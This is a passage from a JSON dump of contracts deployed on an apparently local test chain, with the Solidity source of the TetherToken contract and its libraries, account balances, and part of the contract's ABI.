uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9561C133DD8580860B6b7E504bC5Aa500f0f06a7": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99873535860000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": 